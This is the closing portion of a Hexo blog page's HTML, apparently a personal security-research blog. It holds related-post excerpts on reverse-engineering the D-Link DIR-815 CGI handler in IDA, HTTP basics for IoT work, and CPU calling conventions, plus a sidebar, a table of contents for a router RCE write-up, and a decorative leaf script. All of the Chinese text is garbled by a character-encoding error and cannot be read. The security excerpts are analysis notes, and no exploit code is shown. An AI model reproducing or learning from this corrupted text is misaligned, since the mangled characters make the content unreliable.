ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬é‡åˆ°å¤§å‹htmlä¹Ÿè¿™æ ·æ‰“å—ï¼Œåªæ˜¯åå°±ç”¨åˆ°äº†render_template 123456789from flask import Flask,render_templateapp=Flask(__name__)@app.route(&#x27;/show/sh&#x27;)def show():    return render_template(&quot;index.html&quot;)   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/10/07/DIR-815/" title="DIR-815"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-07</div><div class="info-item-2">DIR-815</div></div><div class="info-2"><div class="info-item-1">é¦–å…ˆï¼š123wget https://unzip æ–‡ä»¶åbinwalk -Me .bin  IDAï¼šæ¼æ´å‡½æ•°123456789101112131415161718192021222345è¡Œ	v0æ˜¯è¯·æ±‚æ–¹å¼ï¼Œå‘ç°æ˜¯postæ–¹å¼if ( strcasecmp(v0, &quot;POST&quot;) )&#123;  v1 = &quot;unsupported HTTP request&quot;;  goto LABEL_7;&#125;50è¡Œ	è¿›å…¥è¿™ä¸ªå‡½æ•°cgibin_parse_request(sub_409AC4, 0, 0x20000);50/22è¡Œ	è¾“å…¥ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œgetenvä¸ºæŸ¥æ‰¾å˜é‡çš„å€¼ if ( getenv(&quot;CONTENT_TYPE&quot;) &amp;&amp; (v6 = getenv(&quot;CONTENT_LENGTH&quot;)) != 0 )  50/32	 v10 = getenv(&quot;REQUEST_URI&quot;);  å›åˆ°hedwigcgi_main: 67è¡Œ	è¿›å…¥è¿™ä¸ªå‡½æ•° sess_get_uid(v4...</div></div></div></a><a class="pagination-related" href="/2025/10/05/IOT%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="IOTå‰ç½®çŸ¥è¯†"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-05</div><div class="info-item-2">IOTå‰ç½®çŸ¥è¯†</div></div><div class="info-2"><div class="info-item-1">åŸºç¡€æº¢å‡ºï¼šå¸¸è§çš„å°±æ˜¯shellcodeå’ŒRopæŠ€æœ¯ HTTPåè®®ï¼šhttpæ˜¯ä¸€ç§è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ˜¯webä¸Šè¿›è¡Œä»»æ„æ•°æ®äº¤æ¢çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯ä¸€ç§å®¢æˆ·ç«¯-æœåŠ¡å™¨åè®®ã€‚ å®ƒç”±è¯·æ±‚å’Œå“åº”ç»„æˆï¼Œä¸‰éƒ¨åˆ†ï¼šè¯·æ±‚è¡Œï¼Œæ¶ˆæ¯æŠ¥å¤´ï¼Œè¯·æ±‚æ­£æ–‡ã€‚ è¯·æ±‚è¡Œï¼š1Method Request-URI HTTP-Version CRLF   æ¶ˆæ¯æŠ¥å¤´ï¼šåŒ…å«å„ä¸ªå­—æ®µï¼Œé€šå¸¸ä»¥key: valueæ ¼å¼è¡¨ç¤ºï¼š 12Content-Length: 348Content-Type: application/x-www-form-urlencoded  è¯·æ±‚æ­£æ–‡ï¼šHTTPè¯·æ±‚æ­£æ–‡æ˜¯è¯·æ±‚æ¶ˆæ¯ä¸­å¯é€‰çš„éƒ¨åˆ†ï¼Œé€šå¸¸ç”¨äºåœ¨ POSTã€PUT æˆ–å…¶ä»–éœ€è¦ä¼ é€’æ•°æ®çš„è¯·æ±‚ä¸­ï¼Œæºå¸¦å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€çš„æ•°æ®ã€‚å®ƒæ˜¯ä½äºè¯·æ±‚å¤´ä¹‹åçš„å®é™…æ•°æ®å†…å®¹ã€‚å¯ç”±å¤šç§æ•°æ®ç»„æˆï¼Œå¦‚è¡¨å•ã€äºŒè¿›åˆ¶ã€JSONç­‰ï¼Œå¦‚ 12345678910POST /api/v1/user HTTP/1.1  # è¯·æ±‚è¡ŒHost: api.example.com       # æ¶ˆæ¯æŠ¥å¤´ï¼ˆå¼€å§‹ï¼‰Content-Type: application/jsonContent-Length: 55  ...</div></div></div></a><a class="pagination-related" href="/2026/02/04/%E4%B8%89%E5%A4%A7%E6%9E%B6%E6%9E%84%E6%AF%94%E8%BE%83/" title="ä¸‰å¤§æ¶æ„æ¯”è¾ƒ"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-04</div><div class="info-item-2">ä¸‰å¤§æ¶æ„æ¯”è¾ƒ</div></div><div class="info-2"><div class="info-item-1">1.å‡½æ•°è°ƒç”¨æœºåˆ¶å…³é”®å¯„å­˜å™¨æ¯”è¾ƒï¼š    x86-64 mips32 arm32    ä¼ å‚å¯„å­˜å™¨ rdiï¼Œrsiï¼Œrdxï¼Œrcxã€r8ã€r9 $a0 åˆ° $a3 r0 åˆ° r3   æ ˆé¡¶æ ˆåº• rbp,rsp $fp,$sp r7,sp   ä¿å­˜è¿”å›åœ°å€ æ— ï¼Œä¿å­˜åœ¨æ ˆä¸Š $ra lr(r14)   æŒ‡ä»¤æŒ‡é’ˆ rip $pc pc(r15)   è·³è½¬å‡½æ•°æŒ‡ä»¤æ¯”è¾ƒï¼š   x86-64 mips32 arm32     è·³è½¬æŒ‡ä»¤ call fun; jal fun; bl fun;   ç‰¹ç‚¹ å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å­˜å…¥ra å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å­˜å…¥lr   ä½†æ˜¯ï¼Œç”±äºmipsåˆ†æ”¯å»¶è¿Ÿæ•ˆåº”ï¼Œé‡åˆ°jl,jalrï¼Œç¨‹åºä¼šä¼˜å…ˆæ‰§è¡Œåé¢ä»£ç å†æ‰§è¡Œè·³è½¬æŒ‡ä»¤ï¼šä¼šå…ˆæ‰§è¡Œaddiuï¼Œå†æ‰§è¡Œjrè·³è½¬ 12jr $raaddiu $sp, 0xE8  å‡½æ•°å†…éƒ¨æŒ‡ä»¤æ¯”è¾ƒï¼šx86-64ï¼š  fun:       push rbp            ; ä¿å­˜æ—§çš„åŸºå€æŒ‡é’ˆ       mov rbp, rsp        ; è®¾ç½®æ–°çš„åŸºå€æŒ‡é’ˆ       sub rsp, 16      ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">hfddh666</div><div class="author-info-description">æ¬¢è¿è®¿é—® hfddh666 çš„åšå®¢ï¼</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" href="/about/"><i class="fab fa-github"></i><span>å…³äºæˆ‘</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">æè¿°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E6%89%8B%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.</span> <span class="toc-text">å…ˆæ‰‹æ“ä½œ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">IDAé€†å‘åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.3.</span> <span class="toc-text">phpæŸ¥çœ‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">2.4.</span> <span class="toc-text">æ¼æ´ç‚¹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mips%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">mipsç³»ç»Ÿé…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E7%89%88qemu%E5%90%AF%E5%8A%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">æ‰‹åŠ¨ç‰ˆqemuå¯åŠ¨é…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E7%89%88%E8%AE%BF%E9%97%AE"><span class="toc-number">3.3.</span> <span class="toc-text">è‡ªåŠ¨ç‰ˆè®¿é—®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">expï¼š</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%87%B4%E8%B0%A2"><span class="toc-number">4.</span> <span class="toc-text">å‚è€ƒè‡´è°¢</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/ret2gets/" title="ret2gets">ret2gets</a><time datetime="2026-02-12T06:28:07.000Z" title="å‘è¡¨äº 2026-02-12 14:28:07">2026-02-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/" title="DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621">DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621</a><time datetime="2026-02-09T09:39:02.000Z" title="å‘è¡¨äº 2026-02-09 17:39:02">2026-02-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/09/python%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/" title="pythonå‰ç«¯å¼€å‘">pythonå‰ç«¯å¼€å‘</a><time datetime="2026-02-09T09:37:07.000Z" title="å‘è¡¨äº 2026-02-09 17:37:07">2026-02-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/04/%E4%B8%89%E5%A4%A7%E6%9E%B6%E6%9E%84%E6%AF%94%E8%BE%83/" title="ä¸‰å¤§æ¶æ„æ¯”è¾ƒ">ä¸‰å¤§æ¶æ„æ¯”è¾ƒ</a><time datetime="2026-02-04T15:07:13.000Z" title="å‘è¡¨äº 2026-02-04 23:07:13">2026-02-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/06/reverse%E5%9F%BA%E7%A1%80/" title="reverseåŸºç¡€">reverseåŸºç¡€</a><time datetime="2025-12-06T15:52:52.000Z" title="å‘è¡¨äº 2025-12-06 23:52:52">2025-12-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By hfddh666</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<script>
  // æ«å¶è„šæœ¬ï¼ˆæ•°é‡å‡å°‘ï¼Œæ›´è½»ç›ˆï¼‰
  $(document).ready(function() {
    var leafCount = 0;
    var maxLeaf = 15;
    var fallSpeed = 1.8;
    
    function createLeaf() {
      if (leafCount >= maxLeaf) return;
      var size = Math.random() * 15 + 10;
      var colors = ['#e65100','#ff7043','#f57c00'];
      var color = colors[Math.floor(Math.random() * colors.length)];
      
      var leaf = $('<div class="maple-leaf"></div>').css({
        top: -size + 'px',
        left: Math.random() * $(window).width() + 'px',
        width: size + 'px',
        height: size + 'px'
      });
      leaf[0].style.setProperty('--leaf-color', color);
      leaf.find('::before').css('background', color);
      
      $('body').append(leaf);
      leafCount++;
      
      leaf.animate({
        top: $(window).height() + size + 'px',
        left: "+=" + (Math.random() * 150 - 75) + "px",
        rotate: Math.random() * 720 + 'deg'
      }, fallSpeed * 20000, 
      function() {
        $(this).remove();
        leafCount--;
      });
    }
    for (var i = 0; i < 8; i++) createLeaf();
    setInterval(createLeaf, 800);
  });
</script>
<script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>